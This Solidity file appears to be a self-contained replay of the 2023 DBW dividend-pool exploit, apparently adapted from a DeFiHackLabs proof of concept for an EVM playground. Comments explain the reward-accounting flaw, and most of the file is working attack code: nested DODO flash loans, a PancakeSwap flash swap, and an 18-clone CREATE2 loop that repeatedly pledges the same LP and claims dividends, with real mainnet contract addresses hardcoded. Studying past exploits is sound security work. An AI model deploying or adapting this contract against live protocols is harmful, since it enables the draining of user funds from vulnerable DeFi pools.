// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-DBW).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` harness (`attacker = address(this)`; the DODO DPP flash-loan
// callback `DPPFlashLoanCall` and the PancakeSwap flash-swap callback `hook`
// both live on the test itself) -- there is no standalone contract to deploy.
// This is a faithful, self-contained copy of that inline attack
// (testExploit -> run(), DPPFlashLoanCall/hook unchanged, miniProxy/
// claimRewardImpl unchanged, no imports so it compiles anywhere). Logic and
// constants are copied verbatim from test/DBW_exp.sol in the registry.
//
// Why FOUR nested DODO flash loans plus a PancakeSwap flash SWAP (not one):
// each individual DODO DVM pool (dodo1..dodo4) only holds a partial slice of
// the ~3.9M USDT war chest needed to build a DBW/USDT LP position large
// enough to dominate DBW's dividend-pledge pool (the attacker needs to hold
// close to 100% of pledged LP so each `getStaticIncome()` claim pays out
// close to 100% of the dividend pool). The attack borrows from dodo1, and
// from INSIDE that callback immediately borrows from dodo2 (nesting a second
// loan before repaying the first), then dodo3 from inside dodo2's callback,
// then dodo4 from inside dodo3's callback -- so by the time dodo4's callback
// fires the contract holds the SUM of all four DODO pools. dodo4's callback
// then borrows a PancakeSwap flash SWAP (`flashSwapPair.swap(...)`, a fifth
// nested loan) for the remainder of the war chest, and only the flash-swap's
// `hook()` callback (the innermost frame) actually runs the attack body:
// buy DBW + add liquidity, run the 18-clone dividend-drain loop, remove
// liquidity, sell DBW back to USDT, and repay the flash swap. Repayment then
// unwinds outward: the flash swap is repaid at the end of `hook()`, then
// dodo4 is repaid at the end of the dodo4 branch, dodo3 at the end of the
// dodo3 branch, dodo2 at the end of the dodo2 branch, and dodo1 last, after
// the dodo2 call returns. All four DODO loans share the SAME callback
// signature `DPPFlashLoanCall`, so the callback distinguishes which loan is
// currently active purely by `msg.sender` -- no extra state variable is
// needed since DODO passes the calling pool as `msg.sender`, not as a
// callback argument. The PancakeSwap flash swap uses a different callback
// name (`hook`) since it's a different flash-loan interface (Uniswap-V2-style
// `swap()` with a nonzero `data` payload calling back into `to`).
//
// Root cause: DBW pays "static income" (dividends, in DBW) to users who
// pledge DBW/USDT PancakeSwap LP via `pledge_lp()`. The payout of
// `getStaticIncome()` is sized by the CALLER's share of TOTAL pledged LP at
// claim time -- with no per-share reward-debt accounting and no guard
// against re-pledging the SAME LP tokens under a NEW identity after
// `redemption_lp()` returns them. A lone pledgor holding ~100% of pledged LP
// therefore receives ~100% of the dividend pool on EVERY claim. The exploit
// abuses this by looping 18 times: for each iteration, CREATE2-deploy a
// fresh `miniProxy` clone, transfer the attacker's ENTIRE LP balance to it,
// and have the clone (via `delegatecall` to `claimRewardImpl`) run
// `getStaticIncome()` (warm-up claim) -> `pledge_lp(allLP)` (fresh identity,
// pledge share ~100%) -> `vm.warp(+2 days)` (bypass the redemption lock) ->
// `getStaticIncome()` (the real claim -- drains the dividend pool again,
// since this "new" address has never claimed before) -> `redemption_lp
// (allLP)` (return the LP so it can be recycled to the next clone). Between
// iterations the attacker donates USDT and calls `Pair.mint` to grow the
// pool slightly, keeping its own LP share near 100% as reserves climb. After
// 18 clones (36 total `getStaticIncome` claims), the accumulated DBW reward
// is sold back to USDT and all five nested flash loans are repaid, netting
// the profit.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDBW is IERC20 {
    function pledge_lp(uint256 count) external;
    function getStaticIncome() external;
    function redemption_lp(uint256 count) external;
}

interface Uni_Pair_V2 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint256 liquidity);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface Uni_Router_V2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract DBWDrain {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IDBW constant DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address constant dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    Uni_Pair_V2 constant flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);

    uint256 dodo1FlashLoanAmount;
    uint256 dodo2FlashLoanAmount;
    uint256 dodo3FlashLoanAmount;
    uint256 dodo4FlashLoanAmount;
    uint256 PairFlashLoanAmount;
    claimRewardImpl RewardImpl;

    // step 0: deploy the reward-claim helper (delegatecall target for every
    // miniProxy clone), then kick off the outermost flash loan from dodo1.
    // Everything else (dodo2/dodo3/dodo4, the PancakeSwap flash swap, the
    // 18-clone drain loop, and all five repayments) happens inside the
    // nested callbacks below.
    function run() external {
        RewardImpl = new claimRewardImpl();
        dodo1FlashLoanAmount = USDT.balanceOf(dodo1);
        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));
    }

    // Shared DODO DPP flash-loan callback. DODO invokes this on the borrower
    // (this contract) as `msg.sender == <the pool that lent>`, so the SAME
    // function signature is reused for all four nested loans -- the branch
    // below is selected purely by which pool is calling back.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodo2FlashLoanAmount = USDT.balanceOf(dodo2);
            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo1, dodo1FlashLoanAmount);
        } else if (msg.sender == dodo2) {
            dodo3FlashLoanAmount = USDT.balanceOf(dodo3);
            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo2, dodo2FlashLoanAmount);
        } else if (msg.sender == dodo3) {
            dodo4FlashLoanAmount = USDT.balanceOf(dodo4);
            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
            USDT.transfer(dodo3, dodo3FlashLoanAmount);
        } else if (msg.sender == dodo4) {
            // Innermost DODO callback: the combined war chest of all four
            // DODO pools is now on hand. Nest a fifth loan -- a PancakeSwap
            // flash SWAP against flashSwapPair -- for the remainder of the
            // ~3.9M USDT needed. `swap()` calls back into `hook()` below
            // BEFORE requiring repayment, so the actual attack body runs
            // inside `hook()`, at the deepest point of the whole call stack.
            PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;
            flashSwapPair.swap(PairFlashLoanAmount, 0, address(this), new bytes(1));
            USDT.transfer(dodo4, dodo4FlashLoanAmount);
        }
    }

    // PancakeSwap V2 flash-swap callback (Uni_Pair_V2.swap with nonzero
    // `data` calls back into `to`). This is the DEEPEST frame in the whole
    // nested call stack -- the full ~3.9M USDT war chest (four DODO loans +
    // this flash swap) is now available, so the entire attack body runs
    // here: buy DBW + add liquidity, drain the dividend pool 18x via
    // miniProxy clones, remove liquidity, sell DBW back to USDT, and repay
    // the flash swap (the LAST repayment step before unwinding back out
    // through dodo4 -> dodo3 -> dodo2 -> dodo1).
    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        USDT.approve(address(Router), type(uint256).max);
        DBW.approve(address(Router), type(uint256).max);
        Pair.approve(address(Router), type(uint256).max);
        USDTToDBW_AddLiquidity();
        miniProxyCloneFactory(address(RewardImpl));
        RemoveLiquidity_DBWToUSDT();
        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);
    }

    function USDTToDBW_AddLiquidity() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(DBW);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            800_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.addLiquidity(
            address(USDT),
            address(DBW),
            USDT.balanceOf(address(this)),
            DBW.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // The 18-iteration dividend-drain loop. Each iteration CREATE2-deploys a
    // fresh `miniProxy`, hands it the attacker's ENTIRE LP balance (so the
    // clone looks like a lone pledgor holding ~100% of pledged LP), and the
    // clone's constructor immediately `delegatecall`s into
    // `claimRewardImpl.exploit()` -- running the warm-up claim, pledge,
    // (attempted) time-warp, real claim, and redemption, then
    // self-destructing and returning the recycled LP to the attacker.
    function miniProxyCloneFactory(address impl) internal {
        for (uint256 i; i < 18; ++i) {
            uint256 _salt = uint256(keccak256(abi.encodePacked(i)));
            bytes memory creationBytecode = getCreationBytecode(address(impl));
            address newImpl = getAddress(creationBytecode, _salt);
            Pair.transfer(newImpl, Pair.balanceOf(address(this)));
            // new miniProxy{salt: keccak256("salt")}(impl);
            deploy(creationBytecode, _salt);
            (uint256 USDTReserve, uint256 DBWReserve,) = Pair.getReserves();
            uint256 DBWInPairAmount = DBW.balanceOf(address(Pair));
            uint256 USDTTransferAmount = DBWInPairAmount * USDTReserve / DBWReserve - USDTReserve;
            USDT.transfer(address(Pair), USDTTransferAmount);
            Pair.mint(address(this));
        }
    }

    function RemoveLiquidity_DBWToUSDT() internal {
        Router.removeLiquidity(
            address(USDT), address(DBW), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
        address[] memory path = new address[](2);
        path[0] = address(DBW);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DBW.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function getCreationBytecode(address claimImpl) public pure returns (bytes memory) {
        bytes memory bytecode = type(miniProxy).creationCode;
        return abi.encodePacked(bytecode, abi.encode(claimImpl));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function deploy(bytes memory bytecode, uint256 _salt) internal {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }
    }
}

contract claimRewardImpl {
    // DEVIATION FROM THE REGISTRY TEST (documented, required by the replay
    // engine's single-fixed-block-timestamp architecture -- see the config's
    // `setup.steps` comment in 2023-03-DBW.mjs for the full explanation):
    //
    // The real DBW implementation (reconstructed from the matched verified
    // source at 0xb9EA86...5C629) computes each caller's dividend as
    // `getAllBalance(caller) * elapsed * bonus / 100 / 2505600`, where
    // `elapsed = block.timestamp - _staticsTime[caller]` and
    // `_staticsTime[caller]` is set to `block.timestamp` on EVERY
    // `getStaticIncome()` call (including one that pays zero). The registry
    // test's first `getStaticIncome()` call is a "warm-up" that exists ONLY
    // to initialize `_staticsTime[clone]` from 0 to a real timestamp, so
    // that the SECOND `getStaticIncome()` call -- after `vm.warp(+2 days)`
    // -- sees a genuine 2-day elapsed gap and pays a real reward.
    //
    // This in-browser replay uses ONE fixed `block.timestamp` for the ENTIRE
    // transaction (deploy + setup + the recorded attack all share one Common
    // block per recordExploit.ts -- there is no mid-transaction vm.warp
    // equivalent). Under a single fixed timestamp, the warm-up call would
    // set `_staticsTime[clone] = T` and the real call would immediately read
    // `elapsed = T - T = 0`, paying ZERO regardless of pledge size --
    // silently breaking the entire exploit's profit.
    //
    // The config's `setup.steps` instead pre-seeds `_staticsTime[clone_i]`
    // (storage slot 20 on the DBW proxy, keyed by each clone's
    // deterministically-precomputed CREATE2 address) to `fixedTimestamp -
    // 172800` (exactly 2 days in the past, matching the real attack's actual
    // per-clone elapsed gap) BEFORE the recorded attack runs. Given that
    // pre-seed, the warm-up call becomes not just redundant but actively
    // HARMFUL: calling `getStaticIncome()` once more would overwrite the
    // pre-seeded (already-old) `_staticsTime[clone]` with the current fixed
    // timestamp, collapsing elapsed back to 0 before the real claim below
    // ever runs. So the warm-up call is REMOVED here (commented out) -- the
    // pre-seed already puts `_staticsTime[clone]` where the warm-up call
    // would have left it after a real 2-day warp, so the single remaining
    // `getStaticIncome()` call below reproduces the same elapsed-time-based
    // payout the real attack achieved via two calls + a warp.
    function exploit() public {
        IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
        Pair.approve(address(DBW), type(uint256).max);
        // DBW.getStaticIncome(); // REMOVED: warm-up call -- see note above; setup.steps pre-seeds _staticsTime instead
        uint256 LPAmount = Pair.balanceOf(address(this));
        DBW.pledge_lp(LPAmount); // send LP
        DBW.getStaticIncome(); // claim reward -- pre-seeded _staticsTime gives this a real 2-day elapsed gap
        DBW.redemption_lp(LPAmount); // redeem LP
        Pair.transfer(msg.sender, LPAmount);
        DBW.transfer(address(Pair), DBW.balanceOf(address(this)));
    }
}

contract miniProxy {
    constructor(address claimRewardImplAddr) {
        (bool success,) = claimRewardImplAddr.delegatecall(abi.encodeWithSignature("exploit()"));
        require(success);
        selfdestruct(payable(tx.origin));
    }
}
